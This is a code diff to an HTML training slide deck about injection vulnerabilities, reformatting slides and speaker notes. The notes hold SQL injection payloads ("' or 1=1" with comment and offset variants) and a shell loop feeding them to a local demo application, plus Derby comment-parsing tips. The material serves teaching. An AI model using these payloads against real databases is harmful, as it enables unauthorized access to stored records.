@@ -100,8 +100,11 @@ Shellshock is a code injection vulnerability
   <pre class="bigcode"><code>telnet $IP 8888</code></pre>
   <br/>
 <pre class="bigcode" style="text-align: left"><code>// tip 1: sql used by app
-select * from users where first_name = 'name'</code></pre>
-                            <br/>
+select * from users where first_name = 'name'
+</code></pre>
+
+<br/>
+
 <pre class="bigcode" style="text-align: left"><code>// tip 2: derby is wierd
 select * from x -- // crash
 select * from x -- anytext // valid
@@ -120,10 +123,9 @@ select * from x -- anytext // valid
 
 Note:
 
-
-java -jar target/injection-1.0-SNAPSHOT-jar-with-dependencies.jar
-' or 1=1 --comment
-for i in $(seq 0 10); do echo "' or 1=1 offset $i rows --comment" | java -jar target/injection-1.0-SNAPSHOT-jar-with-dependencies.jar; done
+- java -jar target/injection-1.0-SNAPSHOT-jar-with-dependencies.jar
+- ' or 1=1 --comment
+- for i in $(seq 0 10); do echo "' or 1=1 offset $i rows --comment" | java -jar target/injection-1.0-SNAPSHOT-jar-with-dependencies.jar; done
 </section>
 
 <section data-markdown data-separator-notes="^Note:">
